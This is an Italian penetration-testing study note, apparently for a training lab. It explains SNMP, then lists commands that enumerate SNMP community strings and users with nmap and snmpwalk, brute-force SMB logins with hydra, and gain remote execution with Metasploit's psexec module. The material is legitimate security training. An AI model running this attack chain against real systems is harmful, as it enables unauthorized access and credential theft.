- **SNMP** (Simple Network Management Protocol) è un protocollo. Consente agli **amministratori di rete** di **interrogare** i **dispositivi per ottenere informazioni** sullo stato, configurare determinate impostazioni e ricevere avvisi e trappole quando si verificano eventi specifici. Quindi **utilizzato** per il **monitoraggio** e la **gestione** dei **dispositivi** di rete, come **router**,
**switch**, **stampanti**, **server** e altro.
- SNMP è un protocollo di **livello applicativo** che in genere **utilizza** **UDP**
per il trasporto. Comprende tre componenti principali:
    - **SNMP Manager** : Il **sistema** responsabile dell'interrogazione e dell'interazione con gli
    agenti SNMP sui dispositivi in rete.
    - **SNMP Agent**: **Software** in esecuzione sui dispositivi in rete che risponde alle
    interrogazioni SNMP e invia trappole.
    - **Manager information Base (MIB)**: Un **database** gerarchico che definisce la
    struttura dei dati disponibili tramite SNMP. Ogni dato ha un unico Object Identifier
    (OID).
- **Versioni** di SNMP:
    - **SNMPv1**: la prima versione, che utilizza le stringhe di comunità (essenzialmente
    **password**) **per l'autenticazione**.
    - **SNMPv2c:** una versione migliorata con supporto per i trasferimenti di massa, ma
    che si basa ancora sulle stringhe di comunità per l'autenticazione.
    - **SNMPv3:** introdotte funzionalità di sicurezza, tra cui la **crittografia**, il messaggio
    integrità e autenticazione basata sull'utente.
- **Porte:**
    - **Porta 161 (UDP)**: Utilizzata per le **interrogazioni** SNMP.
    - **Porta 162 (UDP):** Utilizzata per le **trappole** SNMP (notifiche).
    
    ### Enumerazione SNMP
    
    L'enumerazione SNMP nei test di penetrazione comporta **l'interrogazione**
    dei **dispositivi** **abilitati SNMP** per raccogliere informazioni utili:
    
- **Identificare i dispositivi abilitati SNMP**: Determinare quali **dispositivi** della rete sono **dotati di SNMP** e se sono **vulnerabili** alla fuga di informazioni o agli **attacchi**.
- **Estrazione delle informazioni di sistema:** Raccogliere i **dati** relativi al **sistema**, come i **nomi** dei dispositivi, il funzionamento sistemi, **versioni** software, **interfacce di rete** e altro ancora.
- **Identificare le stringhe di comunità SNMP:** Verifica la **presenza** di stringhe di comunità (**password**) predefinite o deboli, possono garantire l'accesso non autorizzato alle informazioni del dispositivo.
- **Recupero delle configurazioni di rete:** Raccogliere **informazioni tabelle di routing**, interfacce
di rete, **indirizzi IP** e altri dettagli specifici della rete.
- **Raccogliere informazioni su utenti e gruppi:** In alcuni casi, **SNMP** **può** **rivelare informazioni** e **permessi di accesso degli utent**i
- **Identificazione di servizi e applicazioni:** Scoprire quali **servizi** e **applicazioni** sono in **esecuzione**
sui dispositivi di destinazione, potenzialmente in grado di portare a ulteriori vettori di attacco.

PROCEDIMENTO

1. utilizzeremo il servizio SNMP per trovare le **credenziali** per **accedere** con **smb**
2. **nmap -T4 -sS -vvv --top-ports 100 -Pn -sU IP_TARGET** avviamo una scansione TCP ed UDP

AVVIARE SCRIPT PER ENUMERARE

metodo 1 

- **nmap -A -sS -Pn -sC -sU -p161 IP_TARGET** facile e veloce

metodo2

- **ls -al /usr/share/nmap/scripts | grep -e “snmp”** troviamo gli script, possiamo anche utilizzare -A
- **nmap -sU -pNUMERO_PORTA --script=snmb-brute IP_TARGET** enumera server community string, utile per utilizzare il prossimo tool
- **snmpwalk -v 1 -c public IP_TARGET**  ci darà tante info ma molto confuse da leggere. per otterenere Info leggibili avviare nmap con -A sulla porta target oppure
    1. **-v** specificare la versione del protocollo snmp
    2. -**c** specificare la community string da enumerare

metodo 3

- **nmap -sU -p 161 --script snmp-* IP_TARGET > snmp_output** avvia tutti gli script per snmp con output leggibile

---

1. **nano users.txt** creiamo un file con gli users enumerati
2. **hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb**
3. **service postgresql start && msfconsole -q**
4. **use exploit/windows/smb/psexec**
    1. **set RHOSTS IP_TARGET**
    2. **set SMBUser USERNAME**
    3. **set SMBPass PASSWORD**
    4. **exploit**
